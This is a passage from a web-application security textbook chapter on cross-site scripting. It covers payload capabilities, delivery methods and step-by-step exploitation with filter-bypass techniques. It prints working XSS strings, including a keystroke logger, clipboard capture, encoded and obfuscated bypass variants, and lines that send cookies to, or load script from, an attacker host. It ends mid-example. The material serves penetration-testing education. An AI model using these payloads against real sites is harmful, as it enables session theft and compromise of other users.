more than they do those on the public Internet—for example, with\nInternet Explorer if a computer is part of a corporate domain, the browser will\ndefault to a lower level of security when accessing intranet-based applications.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 396\n396 Chapter 12 ■ Attacking Other Users\nEscalating the Client-Side Attack\nThere are numerous ways in which a web site may directly attack users who\nvisit it. Any of these attacks may be delivered via a cross-site scripting flaw in\na vulnerable application (although they may also be delivered directly by any\nmalicious web site that a user happens to visit).\nLog Keystrokes\nJavaScript can be used to monitor all keys pressed by the user while the\nbrowser window is active, including passwords, private messages, and other\npersonal information. The following proof-of-concept script will capture all\nkeystrokes in Internet Explorer and display them in the status bar of the\nbrowser:\n<script>document.onkeypress = function () {\nwindow.status += String.fromCharCode(window.event.keyCode);\n} </script>\nCapture Clipboard Contents\nJavaScript can be used to capture the contents of the clipboard. The following\nproof-of-concept script will display an alert containing the current contents of\nthe clipboard:\n<script>\nalert(window.clipboardData.getData(‘Text’));\n</script>\nMonitoring the clipboard periodically while a user works on other tasks\nmight result in all kinds of information being captured. For example, there are\nsome secure email applications that use the clipboard when encrypting and\ndecrypting messages, and do not clear its contents after use. (Note that Inter-\nnet Explorer 7 asks the user for permission before allowing clipboard contents\nto be captured, to prevent this type of attack.)\nSteal History and Search Queries\nJavaScript can be used to perform a brute-force exercise to discover third-\nparty sites recently visited by the user, and queries that they have performed\non popular search engines. This can be done by dynamically creating hyper-\nlinks for common web sites, and for common search queries, and using the\ngetComputedStyleAPI to test whether the link is colorized as visited or not\nvisited. A huge list of possible targets can be quickly checked with minimal\nimpact on the user.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 397\nChapter 12 ■ Attacking Other Users 397\nEnumerate Currently Used Applications\nJavaScript can be used to determine whether the user is presently logged in to\nthird-party web applications. Most applications contain protected pages that\ncan be viewed only by logged-in users, such as a My Details page. If an unau-\nthenticated user requests the page, she receives different content such as an\nerror message or a redirection to the login.\nThis behavior can be leveraged to determine whether a user is logged in to\na third-party application. The injected script can issue a request for the pro-\ntected page to determine its state. A key constraint here, of course, is\nthat although the script can make arbitrary requests, it cannot process\nthe responses, due to the browser’s same origin policy. However, recall that\nthe same origin policy treats scripts themselves as code rather than data, and\napplications are allowed to load and execute scripts from a different domain.\nThis provides enough of a toehold for an attacker to determine what state the\nprotected page is in and, therefore, whether the user is logged in.\nThe trick is to attempt to dynamically load and execute the protected page\nas a piece of JavaScript:\nwindow.onerror = fingerprint;\n<script src=”https://other-app.com/MyDetails.aspx”></script>\nOf course, whatever state the protected page is in, it contains only HTML, so\na JavaScript console error is thrown. Crucially, the console error will contain a\ndifferent line number and error type depending on the exact HTML document\nreturned. The attacker can implement an error handler (in the fingerprint\nfunction) that checks for the line number and error type that arise when the\nuser is logged in. Despite the same origin restrictions, the attacker’s script can\nthereby deduce what state the protected page is in.\nHaving determined which popular third-party applications the user is\npresently logged in to, the attacker can then carry out highly focused cross-site\nrequest forgery attacks, to perform arbitrary actions within those applications\nin the security context of the compromised user (see the “Request Forgery”\nsection, later in this chapter).\nPort Scan the Local Network\nUsing techniques pioneered by Jeremiah Grossman and Robert Hansen,\nJavaScript can be used to perform a port scan of hosts on the user’s local net-\nwork, to identify services that may be exploitable. If a user is behind a corpo-\nrate or home firewall, an attacker will be able to reach services that cannot be\naccessed from the public Internet. If the attacker scans the client computer’s\nloopback interface, he may be able to bypass any personal firewall installed by\nthe user.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 398\n398 Chapter 12 ■ Attacking Other Users\nBrowser-based port scanning can use a Java applet to determine the user’s\nIP address (which may be NAT-ed from the public Internet), and so infer the IP\nrange of the local network. The script can then initiate HTTP connections to\narbitrary hosts and ports to test connectivity. As already described, the same\norigin policy prevents the script from processing the responses to these\nrequests. However, a similar trick as was used to detect login status can also be\nused to test for network connectivity. Here, the attacker’s script attempts to\ndynamically load and execute a script from each targeted host and port. If a\nweb server is running on that port, it will return HTML or some other content,\nresulting in a JavaScript console error that the port scanning script can detect.\nOtherwise, the connection attempt will time out or return no data, in which\ncase no error is thrown. Hence, despite the same origin restrictions, the port-\nscanning script can confirm connectivity to arbitrary hosts and ports.\nAttack Other Network Hosts\nFollowing a successful port scan to identify other hosts, a malicious script can\nattempt to fingerprint each discovered service and then attack it in various\nways. Many web servers contain image files located at unique URLs. The fol-\nlowing code checks for a specific image associated with a popular range of\nDSL routers:\n<img src=”http://192.168.1.1/hm_icon.gif” onerror=”notNetgear()“>\nIf the function notNetgearis not invoked, then the server has been success-\nfully fingerprinted. The script can then proceed to attack the web server, either\nby exploiting any known vulnerabilities in the particular software, or by per-\nforming a request forgery attack (described later in this chapter). In this exam-\nple, the attacker could attempt to reconfigure the router to open up additional\nports on its external interface, or expose its administrative function to the\nworld. Note that many highly effective attacks of this kind only require the\nability to issue arbitrary requests, not to process their responses, and so are not\naffected by the browser’ssame origin policy.\nIn certain situations, an attacker may be able to leverage anti-DNS pinning\ntechniques to violate the same origin policy and actually retrieve content from\nweb servers on the local network. These attacks are described later in this\nchapter.\nGoing beyond attacks against web servers, Wade Alcorn has performed\nsome interesting research demonstrating the possibilities for attacking other\nnetwork services via a hijacked browser. See the following paper for more\ndetails:\nwww.ngssoftware.com/research/papers/InterProtocolExploitation.pdf\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 399\nChapter 12 ■ Attacking Other Users 399\nExploit Browser Vulnerabilities\nIf bugs exist within the user’s browser or any installed plug-ins, an attacker\nmay be able to exploit these via malicious JavaScript or HTML. In some cases,\nbugs within plug-ins such as the Java VM have enabled attackers to perform\ntwo-way binary communication with non-HTTP services on the local com-\nputer or elsewhere, enabling the attacker to exploit vulnerabilities that exist\nwithin other services identified via port scanning. Many software products\n(including non–browser-based products) install ActiveX controls that may\ncontain vulnerabilities.\nDelivery Mechanisms for XSS Attacks\nHaving identified an XSS vulnerability and formulated a suitable payload to\nexploit it, an attacker needs to find some means of delivering the attack to\nother users of the application. We have already discussed several ways in\nwhich this can be done. In fact, there are many other delivery mechanisms\navailable to an attacker.\nDelivering Reflected and DOM-Based XSS Attacks\nIn addition to the obvious phishing vector of bulk emailing a crafted URL to\nrandom users, an attacker may attempt to deliver a reflected or DOM-based\nXSS attack via the following mechanisms:\n■■ In a targeted attack, a forged email may be sent to a single target user,\nor a small number of users. For example, an application administrator\ncould be sent an email apparently originating from a known user, com-\nplaining that a specific URL is causing an error. When an attacker wants\nto compromise the session of a specific user (rather than harvest those\nof random users) a well-informed and convincing targeted attack is\noften the most effective delivery mechanism.\n■■ A URL can be fed to a target user in an instant message.\n■■ Content and code on third-party web sites can be used to generate\nrequests that trigger XSS flaws. For example, wahh-innocuous.com\nmight contain interesting content as an inducement for users to visit,\nbut it may also contain scripts that cause the user’s browser to make\nrequests containing XSS payloads to a vulnerable application. If a user\nis logged in to the vulnerable application, and happens to browse wahh-\ninnocuous.com, then the user’s session with the vulnerable application\nwill be compromised.\nHaving created a suitable web site, an attacker may use search engine\nmanipulation techniques to generate visits from suitable users—for\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 400\n400 Chapter 12 ■ Attacking Other Users\nexample, by placing relevant keywords within the site content and link-\ning to the site using relevant expressions. This delivery mechanism has\nnothing to do with phishing, however—the attacker’s site does not\nattempt to impersonate the site that it is targeting.\nNote that this delivery mechanism can enable an attacker to exploit\nreflected and DOM-based XSS vulnerabilities that can be triggered only\nvia POSTrequests. With these vulnerabilities, there is obviously not a\nsimple URL that can be fed to a victim user to deliver an attack. How-\never, a malicious web site may contain an HTML form that uses the\nPOSTmethod and has the vulnerable application as its target URL.\nJavaScript or navigational controls on the page can be used to submit\nthe form, successfully exploiting the vulnerability.\n■■ In a variation on the third-party web site attack, some attackers have\nbeen known to pay for banner advertisements that link to a URL con-\ntaining an XSS payload for a vulnerable application. If a user is logged\nin to the vulnerable application, and clicks on the ad, then her session\nwith that application is compromised. Because many providers use\nkeywords to assign advertisementsto pages that are related to them,\ncases have even arisen where an ad attacking a particular application is\nassigned to the pages of that application itself! This not only lends cred-\nibility to the attack but also guarantees that someone who clicks on the\nad is using the vulnerable application at the moment the attack strikes.\nFurther, because many banner ad providers charge on a per-click basis,\nthis technique effectively enables an attacker to “buy” a specific num-\nber of user sessions.\n■■ Many web applications implement a function to “tell a friend” or send\nfeedback to site administrators. This function often enables a user to\ngenerate an email with arbitrary content and recipients. An attacker\nmay be able to leverage this functionality to deliver an XSS attack via\nan email that actually originates from the organization’s own server,\nincreasing the likelihood that even technically knowledgeable users and\nanti-malware software will accept it.\nDelivering Stored XSS Attacks\nThere are two kinds of delivery mechanisms for stored XSS attacks: in-band\nand out-of-band.\nIn-band delivery applies in most cases and is used when the data that is the\nsubject of the vulnerability is supplied to the application via its main web\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 401\nChapter 12 ■ Attacking Other Users 401\ninterface. Common locations where user-controllable data may eventually be\ndisplayed to other users include:\n■■ Personal information fields—name, address, email, telephone, and\nthe like.\n■■ Names of documents, uploaded files, and other items.\n■■ Feedback or questions to application administrators.\n■■ Messages, comments, questions, and the like to other application users.\n■■ Anything that is recorded in application logs and displayed in-browser to\nadministrators, such as URLs, usernames, HTTP Referer, User-Agent,\nand the like.\nIn these cases, the XSS payload is delivered simply by submitting it to the\nrelevant page within the application and then waiting for victims to view the\nmalicious data.\nOut-of-band delivery applies in cases where the data that is the subject of\nthe vulnerability is supplied to the application through some other channel.\nThe application receives data via this channel and ultimately renders it within\nHTML pages that are generated within its main web interface. An example of\nthis delivery mechanism is the attack already described against web mail\napplications, which involves sending malicious data to an SMTP server, which\nis eventually displayed to users within an HTML-formatted email message.\nFinding and Exploiting XSS Vulnerabilities\nA basic approach to identifying XSS vulnerabilities is to use a standard proof-\nof-concept attack string such as the following:\n“><script>alert(document.cookie)</script>\nThis string is submitted as every parameter to every page of the application,\nand responses are monitored for the appearance of this same string. If cases are\nfound where the attack string appears unmodified within the response, then\nthe application is almost certainly vulnerable to XSS.\nIf your intention is simply to identify someinstance of XSS within the applica-\ntion as quickly as possible in order to launch an attack against other appl ication\nusers, then this basic approach is probably the most effective, because it can be\nhighly automated and produces minimal false positives. However, if your objec-\ntive is to perform a comprehensive test of the application, designed to locate as\nmany individual vulnerabilities as possible, then the basic approach needs to be\nsupplemented with more sophisticated techniques. There are several different\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 402\n402 Chapter 12 ■ Attacking Other Users\nways in which XSS vulnerabilities may exist within an application that will not\nbe identified via the basic approach to detection:\n■■ Many applications implement rudimentary blacklist-based filters in an\nattempt to prevent XSS attacks. These filters typically look for expres-\nsions like <script>within request parameters, and take some defensive\naction such as removing or encoding the expression, or blocking the\nrequest altogether. The attack strings commonly employed in the basic\napproach to detection will often be blocked by these filters. However,\njust because one common attack string is being filtered, this does not\ndemonstrate that an exploitable vulnerability does not exist. As you\nwill see, there are cases in which a working XSS exploit can be created\nwithout using <script>tags and even without using commonly filtered\ncharacters like “< >and /.\n■■ The anti-XSS filters implemented within many applications are defec-\ntive and can be circumvented through various means. For example,\nsuppose that an application strips any <script>tags from user input\nbefore it is processed. This means that the attack string used in the basic\napproach will not be returned in any of the application’s responses.\nHowever, it may be that one or more of the following strings will\nbypass the filter, and result in a successful XSS exploit:\n“><script >alert(document.cookie)</script >\n“><ScRiPt>alert(document.cookie)</ScRiPt>\n“%3e%3cscript%3ealert(document.cookie)%3c/script%3e\n“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>\n%00”><script>alert(document.cookie)</script>\nNote that in some of these cases, the input string may be sanitized, decoded,\nor otherwise modified before being returned in the server’s response, and yet\nmight still be sufficient for an XSS exploit. In this situation, no detection\napproach based upon submitting a specific string and checking for its appear-\nance in the server’s response will in itself succeed in finding the vulnerability.\nIn exploits of DOM-based XSS vulnerabilities, the attack payload is not nec-\nessarily returned in the server’s response but is retained in the browser DOM\nand accessed from there by client-side JavaScript. Again, in this situation, no\napproach based upon submitting a specific string and checking for its appear-\nance in the server’s response will succeed in finding the vulnerability.\nFinding and Exploiting Reflected XSS Vulnerabilities\nThe most reliable approach to detecting reflected XSS vulnerabilities begins in\na similar way to the basic approach described previously.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 403\nChapter 12 ■ Attacking Other Users 403\nHACK STEPS\n■ Choose a unique arbitrary string which does not appear anywhere within\nthe application and which contains only alphabetical characters and so is\nunlikely to be affected by any XSS-specific filters. For example:\nmyxsstestdmqlwp\n■ Submit this string as every parameter to every page, targeting only one\nparameter at a time.\n■ Monitor the application’s responses for any appearance of this same\nstring. Make a note of every parameter whose value is being copied into\nthe application’s response. These are not necessarily vulnerable, but\neach instance identified is a candidate for further investigation, as\ndescribed in the next part of this section.\n■ Note that both GETand POSTrequests need to be tested, and you should\ninclude every parameter within both the URL query string and the mes-\nsage body. While a smaller range of delivery mechanisms exists for XSS\nvulnerabilities that can only be triggered via a POSTrequest, exploitation\nis still possible, as previously described.\n■ In addition to the standard request parameters, you should also test\nevery instance in which the contents of an HTTP request header is\nprocessed by the application. A common XSS vulnerability arises in error\nmessages, where items such as the Refererand User-Agentheaders\nare copied into the contents of the message. These headers are valid\nvehicles for delivering a reflected XSS attack, because an attacker can use\na Flash object to induce a victim to issue a request containing arbitrary\nHTTP headers.\nEach potential vulnerability you have noted needs to be manually investi-\ngated to verify whether it is actually exploitable. Your objective here is to find\na way of crafting your input such that, when it is copied into the same location\nin the application’s response, it will result in execution of arbitrary JavaScript.\nLet’s look at some examples of this.\nExample 1\nSuppose that the returned page contains the following:\n<input type=”text” name=”address1” value=”myxsstestdmqlwp”>\nOne obvious way to craft an XSS exploit is to terminate the double quotation\nmarks that are enclosing your string, close the <input> tag, and then employ\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 404\n404 Chapter 12 ■ Attacking Other Users\nsome means of introducing JavaScript (using <script>, <img src=\n’javascript:...’>, etc.). For example:\n“><script>alert(document.cookie)</script><!--\nAn alternative method in this situation, which may bypass certain input fil-\nters, is to remain within the <input>tag itself but inject an event handler con-\ntaining JavaScript. For example:\n“onfocus=”alert(document.cookie)\nExample 2\nSuppose that the returned page contains the following:\n<script>var a = ‘myxsstestdmqlwp’; var b = 123; ... </script>\nHere, the string you control is being inserted directly into an existing script.\nTo craft an exploit, you can terminate the single quotation marks around your\nstring, terminate the statement with a semicolon, and then proceed directly to\nyour desired JavaScript. For example:\n‘; alert(document.cookie); var foo=’\nNote that because you have terminated a quoted string, to prevent errors\noccurring within the JavaScript interpreter it is necessary to ensure that the\nscript continues gracefully with valid syntax after your injected code. In this\nexample, the variable foo is declared, and a second quoted string is opened,\nwhich will be terminated by the code that immediately follows your string.\nAnother method that is often effective is to end your input with //to comment\nout the remainder of the line.\nExample 3\nSuppose that the returned page contains the following:\n<img src=”myxsstestdmqlwp”>\nHere, the string you control is being inserted into the srcattribute of an <img>\ntag. On some browsers, this attribute may contain a URL that uses the\njavascript:protocol, allowing the following straightforward exploit to be used:\njavascript:alert(document.cookie);\nFor an attack that works against all current browsers, you can use an invalid\nimage name together with an onerrorevent handler:\n“onerror=”alert(document.cookie)\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 405\nChapter 12 ■ Attacking Other Users 405\nTIP As with other attacks, be sure to URL-encode any special characters that\nhave a significance within the request, including &=+;and space.\nOther Entry Points for JavaScript\nIn addition to the common examples just illustrated, there are numerous other\npossible entry points for XSS attacks, arising from the complexities of the\nHTML language. Many of these examples are affected by anomalies in the way\ndifferent browser platforms and versions handle unusual HTML. For example:\n■■ On Internet Explorer, many tags will accept a styleattribute containing\nJavaScript in an expressionstring. For example:\nstyle=x:expression(alert(document.cookie))\n■■ In Firefox, if you control the contentattribute of a refresh meta tag, you\ncan inject a URL that uses the javascript:protocol (as well as doing\narbitrary redirects). For example:\n<meta http-equiv=”refresh” content=0;url=javascript:alert(document\n.cookie);>\nIf you encounter any unusual situations that you are unfamiliar with, we\nrecommend that you consult the excellent XSS Cheat Sheet maintained by\nRSnake, located here:\nhttp://ha.ckers.org/xss.html\nHACK STEPS\nFor each potential XSS vulnerability noted in the previous steps:\n■ Review the HTML source to identify the location(s) of your unique string.\n■ If the string appears more than once, then each occurrence needs to be\ntreated as a separate potential vulnerability and investigated individually.\n■ Determine, from the location within the HTML of the user-controllable\nstring, how you need to modify it in order to cause execution of arbitrary\nJavaScript. Typically, numerous different methods will be potential vehi-\ncles for an attack.\n■ Attempt to use the various injection vectors described, and consult the\nXSS Cheat Sheet at http://ha.ckers.org/xss.htmlto identify addi-\ntional unusual vectors.\n■ Test your exploit by submitting it to the application. If your crafted string\nis still returned unmodified, then the application is vulnerable. Double-\ncheck that your syntax is correct by using a proof-of-concept script to\ndisplay an alert dialog, and confirm that this actually appears in your\nbrowser when the response is rendered.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 406\n406 Chapter 12 ■ Attacking Other Users\nVery often, you will discover that your initial attempted exploits do not\nactually get returned unmodified by the server, and so do not succeed in exe-\ncuting your JavaScript. If this happens, do not give up! Your next task is to\ndetermine what server-side processing is occurring that is affecting your\ninput. There are three broad possibilities:\n■■ The application has identified an attack signature and has blocked your\ninput altogether.\n■■ The application has accepted your input but has performed some kind\nof sanitization or encoding on the attack string.\n■■ The application has truncated your attack string to a fixed maximum\nlength.\nWe will look at each scenario in turn and discuss various ways in which the\nobstacles presented by the application’s processing can be bypassed.\nBeating Signature-Based Filters\nIn the first type of filter, the application will typically respond to your attack\nstring with an entirely different response than it did for the harmless string—\nfor example, with an error message, possibly even stating that a possible XSS\nattack was detected, as shown in Figure12-9.\nFigure12-9: An error message generated by ASP.NET’s anti-XSS filters\nIf this occurs, then the next step is to determine what characters or expres-\nsions within your input are triggering the filter. An effective approach is to\nremove different parts of your string in turn and see whether the input is still\nbeing blocked. Typically, this process establishes fairly quickly that a specific\nexpression such as <script>is causing the request to be blocked. If this is the\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 407\nChapter 12 ■ Attacking Other Users 407\ncase, then you need to test the filter to establish whether any bypasses exist.\nThe bypasses that are commonly found in real-world XSS filters include the\nfollowing:\n■■ Many filters match specific tags, including the opening and closing\nangle brackets. However, most browsers tolerate whitespace before the\nclosing bracket, which allows an easy bypass of the filter. For example:\n<script >\n■■ Because many people write HTML in lowercase, some filters check for\nonly the usual lowercase version of malicious tags. These filters can be\nbypassed by varying the case. For example:\n<ScRiPt>\n■■ Some filters match any pair of opening and closing angle brackets, with\nany content in between. Even if you have no alternative but to inject a\nnew tag, it is often possible to bypass this filter by relying upon the\nexisting surrounding syntax to close your injected tag for you. For\nexample, if you control the value of the valueattribute here:\n<input type=”hidden” name=”pageid” value=”foo”>\nthen you can use input like the following, which is not blocked by the\nfilter, to inject a new tag containing JavaScript:\nfoo”><x style=”x:expression(alert(document.cookie))\nA further trick you can use against this kind of filter is to exploit the fact\nthat in many contexts browsers tolerate unclosed HTML tags. The fol-\nlowing is invalid HTML, and yet the injected JavaScript is still exe-\ncuted:\n<img src=”“ onerror=alert(document.cookie)\n■■ Some filters match pairs of opening and closing angle brackets, extract\nthe contents, and compare this to a blacklist of tag names. In this situa-\ntion, you may be able to bypass the filter by using superfluous brackets,\nwhich are tolerated by the browser. For example:\n<<script>alert(document.cookie);//<</script>\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 408\n408 Chapter 12 ■ Attacking Other Users\n■■ Some filters stop processing a string when they encounter a null byte,\neven though the text following the null byte is still returned in the\napplication’s response. These filters can be bypassed by inserting a\nURL-encoded null byte before the filtered expression. For example:\nfoo%00<script>\n■■ Depending on the target browser, you can often insert characters into a\nfiltered expression that will bypass the filter and yet be tolerated by the\nbrowser. For example:\n<script/src=...\n<scr%00ipt>\nexpr/****/ession\n■■ If user-supplied data is (further) canonicalized after the filter is applied,\nthen it may be possible to bypass the filter and still exploit the vulnera-\nbility, by URL-encoding or double-encoding the filtered expression. For\nexample:\n%3cscript%3e\n%253cscript%253e\n■■ A particular case of the generic canonalization bypass arises in relation\nto XSS, because attack payloads returned in responses may be decoded\nby the victim’s browser, after all input validation performed by the\nserver has been completed. In certain situations, you can HTML-encode\nyour attack payload to defeat the server’s input validation, and the vic-\ntim’s browser will decode your payload again for you. For example, the\nexpression javascript:is often blocked to defeat attacks using this\nprotocol. However, the expression can be HTML-encoded in various\nways that are tolerated by many browsers. For example:\n<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;\n&#58; ...\n<img src=&#0000106;&#0000097;&#0000118;&#0000097;&#0000115;&#0000099;\n&#0000114;&#0000105;&#0000112;&#0000116;&#0000058; ...\n<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A ...\nThese examples respectively use standard UTF-8 encoding, standard\nencoding with superfluous padding, and encoding in hexadecimal with\nsemicolons omitted. The various possible permutations of the different\nencoding types are of course very large.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 409\nChapter 12 ■ Attacking Other Users 409\nTIP In some cases, you may succeed in being able to execute some JavaScript\nbut face restrictions on the commands and keywords that you can employ in\nyour code. In this situation, the application’s filters can often be bypassed by\nbuilding and executing statements dynamically. For example, if the application\nblocks any user-supplied data containing the expression document.cookie,\nthen this can be trivially bypassed using\nvar a = “alert(doc” + “ument.coo” + “kie)“; eval(a);\nor even\nvar a = “alert(“ + String.fromCharCode(100,111,99,117,109,101,110,\n116,46,99,111,111,107,105,101) + “)“; eval(a);\nBeating Sanitization\nOf all the obstacles that you may encounter when attempting to exploit poten-\ntial XSS conditions, this is probably the most common. Here, the application\nperforms some kind of sanitization or encoding on your attack string which\nrenders it harmless, preventing it from causing the execution of JavaScript.\nThe most prevalent manifestation of data sanitization occurs when the\napplication HTML-encodes certain key characters that are necessary to deliver\nan attack (so <becomes &lt;and >becomes &gt;). In other cases, the applica-\ntion may remove altogether certain characters or expressions, in an attempt to\ncleanse your input of malicious content.\nWhen this defense is encountered, the first step is to determine precisely\nwhich characters and expressions are being sanitized, and whether it is still\npossible to carry out an attack with the remaining characters. For example, if\nyour data is being inserted directly into an existing script, you may not need to\nemploy any HTML tag characters. If it appears impossible to perform an attack\nwithout using input that is being sanitized, then you need to test the effective-\nness of the sanitizing filter to establish whether any bypasses exist. Here are\nsome examples of common bypasses:\n■■ If the filter removes certain expressions altogether, and at least one of\nthe removed expressions is more than one character in length, then it\nmay be possible to smuggle that expression past the filter, provided that\nthe sanitization is not applied recursively. For example:\n<scr<script>ipt>\n■■ As previously described for signature-based filters, it may be possible\nto bypass a sanitizing filter by encoding filtered expressions or by\ninserting a null byte before them.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 410\n410 Chapter 12 ■ Attacking Other Users\n■■ When you are injecting into a quoted string in an existing script, it is\ncommon to find that the application places the backslash character\nbefore any quotation mark characters that you inject. This escapes your\nquotation marks, preventing you from terminating the string and inject-\ning arbitrary script. In this situation, you should always verify whether\nthe backslash character itself is being escaped. If not, then a simple filter\nbypass is possible. For example, if you control the value fooin\nvar a = ‘foo’;\nthen you can inject\nfoo\\‘; alert(document.cookie);//\nThis results in the following response, in which you now control the\nscript. Note the use of the JavaScript comment character //to comment\nout the remainder of the line, thus preventing a syntax error caused by\nthe application’s own string delimiter:\nvar a = ‘foo\\\\‘; alert(document.cookie);//‘;\n■■ In the preceding example, if you find that the backslash character is also\nbeing properly escaped, but that angle brackets are returned unsani-\ntized, then you can use the following attack:\n</script><script>alert(document.cookie)</script>\nThis effectively abandons the application’s original script and injects a\nnew one immediately after it. The attack works because browsers’ pars-\ning of HTML tags takes precedence over their parsing of embedded\nJavaScript:\n<script>var a = ‘</script><script>alert(document.cookie)</script>\nAlthough the original script now contains an error, this does not matter\nbecause the browser moves on and executes your injected script\nregardless of the error in the original script.\n■■ In the previous two attacks, where you are able to take control of a\nscript but are prevented from using either single or double quotation\nmarks because these are being escaped, you can use the String.from-\nCharCodetrick to construct strings without the need for delimiters.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 411\nChapter 12 ■ Attacking Other Users 411\nTIP In several of the filter bypasses described, the attack results in HTML that\nis malformed but is nevertheless tolerated by the client browser. Because\nnumerous quite legitimate web sites contain HTML that does not strictly comply\nto the standards, browsers accept HTML that is deviant in all kinds of ways, and\neffectively fix up the errors behind the scenes, before the page is rendered.\nOften, when you are trying to fine-tune an attack in an unusual situation, it can\nbe helpful to view the virtual HTML that the browser constructs out of the\nserver’s actual response. In Firefox, you can use the WebDeveloper tool, which\ncontains a View Generated Source function that performs precisely this task.\nBeating Length Limits\nWhen the application truncates your input to a fixed maximum length, there\nare three possible approaches to creating a working exploit.\nThe first, rather obvious, method is to attempt to shorten your attack pay-\nload by using JavaScript APIs with the shortest possible length and removing\ncharacters which are usually included but strictly unnecessary. For example, if\nyou are injecting into an existing script, the following 28-byte command will\ntransmit the user’s cookies to the server with hostname a:\nopen(“//a/“+document.cookie)\nAlternatively, if you are injecting straight into HTML, the following 30-byte\ntag will load and execute a script from the server with hostname a:\n<script src=http://a></script>\nOn the Internet, these examples would obviously need to be expanded to\ncontain a valid domain name or IP address. However on an internal corporate\nnetwork, it may actually be possible to use a machine with the WINS name a\nto host the recipient server.\nTIP You can use Dean Edwards’s JavaScript packer to shrink a given script as\nfar as possible by eliminating unnecessary whitespace. This utility also converts\nscripts to a single line, for easy insertion into a request parameter:\nhttp://dean.edwards.name/packer/\nThe second, potentially more powerful, technique for beating length limits\nis to span an attack payload across multiple different locations where user-\ncontrollable input is inserted into the same returned page. For example, con-\nsider the following URL:\nhttps://wahh-app.com/account.php?page_id=244&seed=129402931&mode=normal\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 412\n412 Chapter 12 ■ Attacking Other Users\nwhich returns a page containing the following:\n<input type=”hidden” name=”page_id” value=”244”>\n<input type=”hidden” name=”seed” value=”129402931”>\n<input type=”hidden” name=”mode” value=”normal”>\nSuppose that there are length restrictions on each of the fields, such that no\nfeasible attack string can be inserted into any of them. Nevertheless, you can\nstill deliver a working exploit, by using the following URL to span a script\nacross the three locations that you control:\nhttps://myapp.com/account.php?page_id=”><script>/*&seed=*/alert(document\n.cookie);/*&mode=*/</script>\nWhen the parameter values from this URL are embedded into the page, the\nresult is the following:\n<input type=”hidden” name=”page_id” value=”“><script>/*“>\n<input type=”hidden” name=”seed” value=”*/alert(document.cookie);/*“>\n<input type=”hidden” name=”mode” value=”*/</script>”>\nThe resulting HTML is entirely valid and is equivalent to only the portions\nhighlighted in bold. The chunks of source code in between have effectively\nbecome JavaScript comments (surrounded by the /* and */ markers) and so\nare ignored by the browser. Hence, your script is executed just as if it had been\ninserted whole at one location within the page.\nTIP The technique of spanning an attack payload across multiple fields can\nsometimes be used to beat other types of defensive filters. It is fairly common to\nfind different data validation and sanitization being implemented on different\nfields within a single page of an application. In the previous example, suppose\nthat the page_idand modeparameters are subject to a maximum length of 12\ncharacters. Because these fields are so short, the application’s developers did\nnot bother to implement any XSS filters. The seedparameter, on the other\nhand, is unrestricted in length, and so rigorous filters were implemented to\nprevent the injection of the characters “ <or >. In this scenario, despite the\ndevelopers’ efforts, it is still possible to insert an arbitrarily long script into the\nseedparameter without employing any of the blocked characters, because the\nJavaScript context can be created by data injected into the surrounding fields.\nA third technique for beating length limits, which can be highly effective in\nsome situations, is to “convert” a reflected XSS flaw into a DOM-based vul-\nnerability. For example, in the original reflected XSS vulnerability, if the appli-\ncation places a length restriction on the messageparameter that is copied into\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 413\nChapter 12 ■ Attacking Other Users 413\nthe returned page, you can inject the following 46-byte script, which evaluates\nthe fragment string in the current URL:\n<script>eval(location.hash.substr(1))</script>\nBy injecting this script into the parameter that is vulnerable to reflected XSS,\nyou can effectively induce a DOM-based XSS vulnerability in the resulting\npage and thus execute a second script located within the fragment string,\nwhich is outside the control of the application’s filters and may be arbitrarily\nlong. For example:\nhttps://wahh-app.com/error.php?message=\n<script>eval(location.hash.substr(1))</script>#alert(‘long script\nhere ......’)\nModifying the Request Method\nIn complex applications that employ a large number of forms, it is common to\nfind several reflected XSS vulnerabilities within POSTrequests, where the vul-\nnerable parameter is submitted within the body of an HTTP message. In these\ncases, it is always worth verifying whether the application handles the request\nin the same way if it is converted to a GETrequest. Most applications will tol-\nerate requests in either form.\nTo perform this check, simply change the method of your crafted request\nfrom POSTto GET, move the message body into the URL query string (inserting\nan additional &if a query string is already present), and remove the Content-\nLengthheader. You can use the Change Request Method action in Burp Proxy\nto perform these tasks for you.\nTest the new request, and if your XSS payload is still executed, then you can\nsimply use the URL from the GETrequest as your attack vector. This makes fea-\nsible a wider range of attack delivery mechanisms and, therefore, increases the\nsignificance of the vulnerability in some contexts.\nCOMMON MYTH “This XSS bug isn’t exploitable. I can’t get my attack to\nwork as a GETrequest.”\nIf a reflected XSS flaw can only be exploited using the POSTmethod, the\napplication is still vulnerable to various attack delivery mechanisms, including\nones that employ a malicious third-party web site.\nIn some situations, converting an attack that uses the GET method into one\nthat uses the POST method may enable you to bypass certain filters. Many\napplications perform some generic application-wide filtering of requests for\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 414\n414 Chapter 12 ■ Attacking Other Users\nknown attack strings. If an application expects to receive requests using the\nGETmethod, it may perform this filtering on the URL query string only. By con-\nverting a request to use the POSTmethod, you may be able to bypass this filter\nentirely.\nUsing Nonstandard Content Encoding\nIn some situations, you can employ a very powerful means of bypassing many\ntypes of filter, by causing the application to accept a nonstandard encoding of\nyour attack payload.\nThe following examples show some representations of the string\n<script>alert(document.cookie)</script>in nonstandard encodings:\nUTF-7:\n+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-\nUS-ASCII:\nBC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 